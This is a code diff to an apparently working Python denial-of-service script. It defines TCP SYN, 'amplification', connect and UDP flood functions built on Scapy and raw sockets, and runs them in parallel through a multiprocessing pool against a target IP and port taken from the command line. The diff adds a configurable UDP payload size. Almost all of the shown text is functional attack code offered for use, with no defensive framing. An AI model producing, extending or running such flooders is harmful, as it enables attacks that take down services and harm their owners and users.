@@ -10,7 +10,7 @@ from os import urandom as _urandom
 
 args = sys.argv[1:]
 
-def synFlood(target_ip, target_port):
+def synFlood(target_ip, target_port, nn):
     rid = random.randint(1000,65534)
     ip = IP(dst = target_ip, tos=0x0, id=rid, ttl=40, flags="DF")
     tcp = TCP(
@@ -30,7 +30,7 @@ def synFlood(target_ip, target_port):
     p = ip / tcp
     send(p, loop = 1, verbose = 0)
 
-def ampFlood(target_ip, target_port):
+def ampFlood(target_ip, target_port, nn):
     ip = IP(dst = target_ip, tos=0x0, ttl=60, flags="DF")
     tcp = TCP(
         sport = RandShort(), 
@@ -44,7 +44,7 @@ def ampFlood(target_ip, target_port):
     p = ip / tcp
     send(p, loop = 1, verbose = 0)
 
-def connectFlood(target_ip, target_port):
+def connectFlood(target_ip, target_port, nn):
     ct = int(time.time())
     ip = IP(dst = target_ip, tos=0x0, ttl=60, flags="DF")
     tcp = TCP(
@@ -64,12 +64,12 @@ def connectFlood(target_ip, target_port):
     p = ip / tcp / raw
     send(p, loop = 1, verbose = 0)
 
-def udpFlood(target_ip, target_port):
+def udpFlood(target_ip, target_port, udpSize):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             address = (target_ip, target_port)
-            sock.sendto(random._urandom(128), address)
+            sock.sendto(random._urandom(udpSize), address)
             # for i in range(3):
             #     sock.sendto(random._urandom(1024), address)
         except:
@@ -81,8 +81,9 @@ if __name__ == "__main__":
     tIP = args[1]
     tP = int(args[2])
     numProcess = int(args[3])
+    udpPacketSize = int(args[4])
 
-    dataList = [(tIP, tP) for _ in range(numProcess)]
+    dataList = [(tIP, tP, udpPacketSize) for _ in range(numProcess)]
     with multiprocessing.Pool(processes=numProcess) as pool:
         if method == "tcp-syn":
             pool.starmap(synFlood, dataList)
